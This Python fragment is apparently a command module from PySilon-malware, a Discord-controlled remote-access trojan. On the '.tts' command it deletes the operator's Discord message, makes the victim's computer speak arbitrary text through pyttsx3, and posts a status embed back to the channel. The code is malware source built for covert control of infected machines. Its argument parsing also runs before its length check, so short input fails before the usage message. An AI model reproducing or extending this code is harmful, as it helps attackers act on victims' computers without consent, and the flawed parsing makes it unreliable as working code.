import pyttsx3
# end of imports

# on message
elif message.content.startswith('.tts'):
    # .log Message is "tts"
    await message.delete()
    # .log Removed the message 
    options = message.content.split()[1:]
    requested_tts = " ".join(options[:-3])
    gender = options[-3].strip('"')
    speed = float(options[-2].strip('"'))
    pitch = float(options[-1].strip('"'))

    if len(options) < 4 or (len(options) == 4 and requested_tts == '.tts'):
        # .log Author issued empty ".tts" command 
        embed = discord.Embed(
            title="📛 Error",
            description='```Syntax: .tts <what-to-say> "gender" "speed" "pitch"```',
            colour=discord.Colour.red()
        )
        embed.set_author(
            name="PySilon-malware",
            icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
        )
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
        # .log Sent message with usage of ".tts" 
    else:
        engine = pyttsx3.init()
        # .log Initialized pyttsx3 Text-to-Speech engine
        engine.setProperty('rate', speed)
        engine.setProperty('pitch', pitch)
        voices = engine.getProperty('voices')
        for voice in voices:
            if gender.lower() in voice.name.lower():
                engine.setProperty('voice', voice.id)
                break

        engine.say(requested_tts)
        # .log Registered requested tts message
        engine.runAndWait()
        # .log Run tts engine
        engine.stop()
        # .log Stopped tts engine
        embed = discord.Embed(
            title="🟢 Success",
            description=f'```Successfully played TTS message: "{requested_tts}"```',
            colour=discord.Colour.green()
        )
        embed.set_author(
            name="PySilon-malware",
            icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
        )
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
        # .log Sent embed about successfully playing tts message
